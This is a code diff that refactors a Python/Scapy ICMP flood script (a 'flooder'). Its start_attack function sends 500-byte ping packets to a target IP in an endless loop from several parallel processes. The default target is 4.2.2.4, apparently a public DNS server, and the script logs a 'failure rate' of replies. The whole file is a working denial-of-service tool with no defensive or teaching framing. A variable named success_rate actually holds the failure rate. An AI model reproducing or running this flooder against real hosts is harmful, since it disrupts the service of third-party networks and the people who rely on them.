@@ -1,82 +1,104 @@
 import os
 import time
 import sys
-import multiprocessing
+from multiprocessing import Process
+
 from scapy.all import *
+from scapy.all import IP, ICMP
 
 TIMEOUT = 2
 conf.verb = 0
 
-def preset(cpu_number): #This method is responsible for starting multiprocessing processes.
-        processes = [multiprocessing.Process(target=start_attack, args=()) for i in range(cpu_number)]
 
-        for i in range(cpu_number):
-                processes[i].start()
-        for i in range(cpu_number):
-                processes[i].join()
+def log(s, *args):
+    print(s % args)
 
-def start_attack():
-        ip_adress = "9.9.9.9"
-        data = "X"*500 #Change 900 to adjust value of bytes in ICMP data field. 1440 bytes maximum.
-        if len(sys.argv) < 2:
-                print "Please give a target"
+
+class Timer:
+    """
+    Used for timing a block and logging it after it finishes
+    """
+
+    def __init__(self, name):
+        self.name = name
+
+    def __enter__(self):
+        self.start = time.clock()
+        return self
+
+    def __exit__(self, *args):
+        self.end = time.clock()
+        self.interval = self.end - self.start
+        log("Block %s took %f seconds", self.name, self.interval)
+
+
+def preset(cpu_number):
+    """
+    This method is responsible for starting multiprocessing
+    processes.
+    """
+    target = sys.argv[1] if len(sys.argv) >= 2 else "4.2.2.4"
+    processes = [Process(target=start_attack, args=(target,)) for _ in range(cpu_number)]
+
+    for i in range(cpu_number):
+        processes[i].start()
+
+    for i in range(cpu_number):
+        processes[i].join()
+
+
+def start_attack(target_ip):
+
+    # meaningless bytes in ICMP data field, should be
+    # lower than MTU
+    data = "X" * 500
+
+    successful_trials = 0
+    failed_trials = 0
+
+    while True:
+
+        pkt = IP(dst=target_ip) / ICMP() / data
+        reply = sr1(pkt, timeout=TIMEOUT)
+
+        if reply is not None:
+            successful_trials += 1
         else:
-                #try:
-                #        packet = sr1(IP(dst="195.175.39.49")/UDP()/DNS(rd=1, qd=DNSQR(qname=sys.argv[1])), verbose=False)
-                #        ip_adress = packet[1][DNSRR].rdata
-                #except:
-                #        ip_adress = sys.argv[1]
-                #print ip_adress
-                s=0 #sucessful trials 
-                f=0 #failed trials
-                while 1:
-                        packet = IP(dst=ip_adress)/ICMP()/data
-                        reply = sr1(packet, timeout=TIMEOUT)
-                        if not (reply is None):
-                                #print reply.dst, "is online"
-                                s=s+1
+            failed_trials += 1
 
-                        else:
-                                #print "Timeout waiting for %s" % packet[IP].dst
-                                f=f+1
-                        #print "failure rate = "+ str( f/(s+f) ) + "f,s=" + str(f) + "," + str(s)
-                        x="failure rate = "+ str( f/(s+f) ) + "f,s=" + str(f) + "," + str(s)
-                        with open('attack_stats.txt', 'w+') as the_file:
-                                the_file.write(x)
+        success_rate = failed_trials / (successful_trials + failed_trials)
 
-#               send(IP(dst=ip_adress)/ICMP()/data, verbose=False, loop=1) #If you want to send limited number of packets, remove loop field and add count=<number of packets> field
+        with open('attack_stats.txt', 'w+') as the_file:
+            the_file.write("failure rate = {}".format(success_rate))
 
 
 def update_pid():
-        pid_path = "/tmp/flooder.pid"
-        if os.path.isfile(pid_path):
-                print "Flooder already exists"
-                exit(1)
-        with open(pid_path, 'w') as f:
-                f.write("%d" % os.getpid())
+    pid_path = "/tmp/flooder.pid"
+    if os.path.isfile(pid_path):
+        log("Flooder already exists")
+        exit(1)
+    with open(pid_path, 'w') as f:
+        f.write("%d" % os.getpid())
+
 
 def delete_pid():
-        os.remove("/tmp/flooder.pid")
+    os.remove("/tmp/flooder.pid")
+
 
 def main():
 
-        update_pid()
+    update_pid()
 
-        t = round(time.time())
+    with Timer("MAIN"):
+        preset(2)
 
-        preset(2)#multiprocessing.cpu_count()-1) #This tool will use all cores of your cpu [except first core], to get maximum effect for this attack. 
-
-        print "Finished with: %s seconds" % (round(time.time() - t))
-        sys.exit()
+    exit(0)
 
 
 if __name__ == '__main__':
-#god help 
-        try:
-                t = round(time.time())
-                main()
-        except:
-                print "Finished with: %s seconds" % (round(time.time() - t))
-                delete_pid()
-                sys.exit()
-                
+    try:
+        main()
+    except:
+        delete_pid()
+        exit(1)
+
